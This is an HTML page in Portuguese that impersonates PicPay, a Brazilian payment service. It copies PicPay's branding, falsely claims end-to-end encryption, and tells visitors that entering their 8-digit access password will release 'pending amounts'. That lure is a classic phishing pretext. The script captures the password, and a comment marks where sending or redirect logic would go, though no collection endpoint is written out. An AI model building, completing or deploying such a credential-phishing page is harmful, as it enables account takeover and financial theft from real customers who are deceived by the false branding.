<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PicPay – Verificação de Segurança</title>
    <style>
        :root {
            --picpay-green: #21C25E;
            --picpay-dark: #11393C;
            --picpay-light-green: #E8F9EE;
            --picpay-gray: #F5F5F5;
            --picpay-text: #2D3333;
            --white: #ffffff;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }

        body {
            background-color: var(--picpay-gray);
            color: var(--picpay-text);
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            background: var(--white);
            width: 100%;
            max-width: 420px;
            padding: 0;
            border-radius: 16px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.08);
            overflow: hidden;
            text-align: center;
        }

        .header-bar {
            background-color: var(--white);
            padding: 30px 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            border-bottom: 1px solid #eee;
        }

        .logo-img {
            height: 40px;
            max-width: 90%;
            object-fit: contain;
        }

        .content {
            padding: 40px 30px;
        }

        .security-icon-img {
            width: 85px;
            height: 85px;
            margin: 0 auto 25px;
            display: block;
            object-fit: contain;
            border-radius: 20px; /* Estilo arredondado suave */
        }

        h2 {
            font-size: 1.4rem;
            font-weight: 700;
            margin-bottom: 12px;
            color: var(--picpay-dark);
            line-height: 1.2;
        }

        .subtitle {
            font-size: 0.95rem;
            color: #666;
            margin-bottom: 35px;
            line-height: 1.5;
        }

        .input-group {
            margin-bottom: 30px;
            text-align: center;
        }

        label {
            display: block;
            font-size: 0.85rem;
            font-weight: 600;
            margin-bottom: 15px;
            color: var(--picpay-dark);
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        input[type="text"] {
            width: 100%;
            max-width: 280px;
            padding: 15px;
            font-size: 28px;
            text-align: center;
            letter-spacing: 6px;
            border: 2px solid #E0E0E0;
            border-radius: 12px;
            outline: none;
            background: #FAFAFA;
            font-weight: 700;
            color: var(--picpay-dark);
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        input:focus {
            background: #fff;
            border-color: var(--picpay-green);
            box-shadow: 0 0 0 4px var(--picpay-light-green);
        }

        .btn-container {
            margin-top: 10px;
        }

        button {
            width: 100%;
            padding: 18px;
            background-color: var(--picpay-green);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 1.1rem;
            font-weight: 700;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            transition: all 0.2s;
        }

        button:hover {
            background-color: #1eb054;
        }

        button:active {
            transform: scale(0.98);
        }

        button:disabled {
            background-color: #e0e0e0;
            color: #aaa;
            cursor: not-allowed;
        }

        .loader {
            width: 22px;
            height: 22px;
            border: 3px solid rgba(255,255,255,0.3);
            border-top-color: #fff;
            border-radius: 50%;
            display: none;
            animation: rotation 0.8s linear infinite;
        }

        @keyframes rotation {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .footer-info {
            margin-top: 30px;
            padding: 20px;
            background: #fdfdfd;
            font-size: 0.75rem;
            color: #999;
            border-top: 1px solid #f0f0f0;
        }

        .message-box {
            display: none;
            background: #FFF0F0;
            border: 1px solid #FFDADA;
            padding: 14px;
            border-radius: 10px;
            margin-bottom: 25px;
            color: #E53935;
            font-size: 0.9rem;
            font-weight: 500;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="header-bar">
        <!-- Logotipo PicPay Superior -->
        <img src="https://logodownload.org/wp-content/uploads/2018/05/picpay-logo-1.png" 
             alt="Logo PicPay" 
             class="logo-img"
             onerror="this.src='https://picpay.com/static/images/logo.png'">
    </div>
    
    <div class="content">
        <!-- SEGUNDA LOGO (Ícone Central Atualizado) -->
        <img src="https://logopng.com.br/logos/picpay-85.png" 
             alt="Ícone PicPay" 
             class="security-icon-img"
             onerror="this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR_xNq4rY5pX_R5yY9T0uY_e_u7h8t_9m_v7A&s'">
             
        <h2>Confirme sua senha de acesso</h2>
        <p class="subtitle">Para garantir sua segurança e liberar os valores pendentes, informe sua senha de 8 dígitos.</p>
        
        <div id="errorMsg" class="message-box"></div>

        <div class="input-group">
            <label>Senha de 8 dígitos</label>
            <input id="pin" type="text" inputmode="numeric" maxlength="8" placeholder="00000000" autocomplete="off">
        </div>

        <div class="btn-container">
            <button id="mainBtn">
                <span class="loader" id="loader"></span>
                <span id="btnText">CONTINUAR</span>
            </button>
        </div>
    </div>

    <div class="footer-info">
        Protegido por Criptografia de Ponta-a-Ponta.<br>
        PicPay Instituição de Pagamento S.A.
    </div>
</div>

<script>
    const pinInput = document.getElementById('pin');
    const mainBtn = document.getElementById('mainBtn');
    const loader = document.getElementById('loader');
    const btnText = document.getElementById('btnText');
    const errorMsg = document.getElementById('errorMsg');

    // Permitir apenas números
    pinInput.addEventListener('input', function(e) {
        this.value = this.value.replace(/[^0-9]/g, '');
    });

    mainBtn.addEventListener('click', function() {
        const val = pinInput.value;
        
        if (val.length === 8) {
            errorMsg.style.display = 'none';
            mainBtn.disabled = true;
            pinInput.disabled = true;
            
            loader.style.display = 'inline-block';
            btnText.textContent = 'VALIDANDO...';
            
            // Simulação de processamento
            setTimeout(() => {
                console.log("Senha enviada:", val);
                // Lógica de envio ou redirecionamento aqui
            }, 2000);
            
        } else {
            errorMsg.textContent = "A senha deve conter exatamente 8 dígitos numéricos.";
            errorMsg.style.display = 'block';
            pinInput.focus();
        }
    });
</script>

</body>
</html>
